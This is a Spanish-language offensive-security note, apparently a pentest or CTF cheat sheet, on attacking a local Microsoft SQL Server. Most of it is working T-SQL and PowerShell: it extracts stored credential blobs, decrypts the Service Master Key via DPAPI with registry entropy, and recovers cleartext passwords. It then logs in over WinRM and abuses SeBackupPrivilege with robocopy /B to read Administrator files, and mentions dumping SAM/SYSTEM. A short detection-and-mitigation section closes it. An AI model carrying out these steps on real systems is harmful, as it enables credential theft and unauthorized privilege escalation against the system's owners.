---
title: MSSQL — descifrar credenciales y abusar de SeBackupPrivilege
tags: [windows, mssql, dpapi, sebackup, privesc]
---

# MSSQL: de sysadmin a credenciales en claro (y de ahí a Administrador)

[🇬🇧 English](mssql-credentials-sebackup.en.md) | **Español**

Nota general para máquinas Windows con SQL Server local: qué hacer cuando ya se es sysadmin pero el objetivo real es una cuenta de servicio o el escritorio de Administrator.

## 1. Confirmar el contexto

```sql
SELECT SUSER_SNAME() AS login, SYSTEM_USER AS ejecuta, IS_SRVROLEMEMBER('sysadmin') AS sa;
SELECT servicename, service_account, status_desc FROM sys.dm_server_services;
```

`xp_cmdshell` ejecuta como la cuenta del servicio (`service_account`), no como el login. Si esa cuenta no es admin, la shell no vale para leer ficheros protegidos: hay que buscar credenciales.

Permisos de impersonación:

```sql
SELECT grantee.name AS quien, permission_name, grantor.name AS otorga
FROM sys.server_permissions p
JOIN sys.server_principals grantee ON grantee.principal_id = p.grantee_principal_id
JOIN sys.server_principals grantor ON grantor.principal_id = p.grantor_principal_id
WHERE permission_name = 'IMPERSONATE';
```

```sql
EXECUTE AS LOGIN='<login>'; SELECT SUSER_SNAME(), IS_SRVROLEMEMBER('sysadmin'); REVERT;
```

## 2. Credenciales de SQL Server

```sql
SELECT credential_id, name, credential_identity FROM sys.credentials;

SELECT DATALENGTH(o.imageval) AS total,
       substring(o.imageval, 5, 16) AS iv,
       substring(o.imageval, 21, DATALENGTH(o.imageval) - 20) AS pass
FROM sys.credentials c
JOIN sys.sysobjvalues o ON c.credential_id = o.objid
WHERE o.valclass = 28 AND o.valnum = 2;
```

- `imageval` = `4 bytes cabecera | IV | ciphertext`.
- IV de 16 bytes y AES en SQL 2012+; 8 bytes y 3DES en SQL 2008.
- **`DATALENGTH`, nunca `LEN`**: `LEN` sobre `varbinary` corta en el primer `0x00`.

## 3. Service Master Key con DPAPI

```sql
SELECT thumbprint, DATALENGTH(crypt_property) AS len,
       substring(crypt_property, 9, DATALENGTH(crypt_property) - 8) AS smk_blob
FROM sys.key_encryptions WHERE key_id = 102;
```

La SMK está protegida con DPAPI `LocalMachine` y una entropía que vive en el registro, por instancia:

```text
HKLM\SOFTWARE\Microsoft\Microsoft SQL Server\<instancia>\Security  → valor Entropy
```

La `<instancia>` sale de `HKLM\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL`.
Ojo con la versión: `MSSQL15` = SQL 2019, `MSSQL16` = 2022, `MSSQL17` = 2025. Leerla antes de programar.

```powershell
Add-Type -AssemblyName System.Security
$ent = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL17.MSSQLSERVER\Security').Entropy
foreach ($b in $blobs) {
  try {
    $key = [System.Security.Cryptography.ProtectedData]::Unprotect($b, $ent, 'LocalMachine')
    break
  } catch { "fallo: $($_.Exception.Message)" }
}
```

Suele haber dos filas (`thumbprint 01` y `03-00-00-00-01`); una falla y la otra no. La clave resultante mide 32 bytes (AES-256) en instalaciones modernas; 16/24 serían 3DES.

Descifrado:

```powershell
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = 'CBC'; $aes.Padding = 'None'
$dec = $aes.CreateDecryptor($key, $iv)
$pt = $dec.TransformFinalBlock($ct, 0, $ct.Length)
[System.Text.Encoding]::Unicode.GetString($pt)
```

El plaintext es la contraseña en UTF-16LE con relleno delante; se localiza a ojo o buscando el patrón legible.

### Requisitos

- Conexión **DAC** al servidor local: `Server=ADMIN:<host>;Trusted_Connection=True`.
- Ser sysadmin en esa conexión (la cuenta de servicio suele serlo).
- Poder llamar a DPAPI `LocalMachine`, que en la práctica permite cualquier usuario local.

## 4. Usar la credencial

```bash
nxc winrm <ip> -u '<usuario>' -p '<password>'
```

Con WinRM abierto (5985/5986) es la vía más limpia. `nxc -x` con shell `cmd` puede dar «no Invoke rights»; cae a PowerShell, donde `&` no es válido: un comando por llamada o `cmd /c ...`.

## 5. SeBackupPrivilege

```powershell
whoami /priv   # SeBackupPrivilege: Enabled  → equivalente a lectura de Administrador
```

```cmd
robocopy C:\Users\Administrator\Desktop C:\Users\Public root.txt /B
type C:\Users\Public\root.txt
```

`/B` activa el modo copia de seguridad y salta las ACL. `robocopy` devuelve código 1 cuando copia: es éxito, no error.

Alternativas si no hay `robocopy`: `SeBackupPrivilegeUtils` o una copia manual de `SAM`/`SYSTEM` para `secretsdump`.

## 6. Cuándo no funciona

- El proxy del Agent falla con «password is incorrect» → el secreto guardado está obsoleto, pero sigue siendo descifrable.
- Step **sin** proxy → corre como `NT Service\SQLSERVERAGENT`, cuenta virtual sin privilegios.
- `OPENROWSET(BULK ...)` → hace falta `bulkadmin`, no basta sysadmin.

## 7. Detección y mitigación

- Sacar `IMPERSONATE` a los logins de aplicación y revisar `sys.server_permissions`.
- Deshabilitar `xp_cmdshell`; si se usa, con proxy de permisos mínimos.
- Rotar secretos de `sys.credentials` y eliminar proxies obsoletos.
- Vigilar creación de jobs de SQL Agent y conexiones DAC.
- Sacar cuentas de servicio de `Backup Operators`; auditar `SeBackupPrivilege` y `SeRestorePrivilege`.
- MITRE: T1505.001, T1059.001, T1548, T1003.
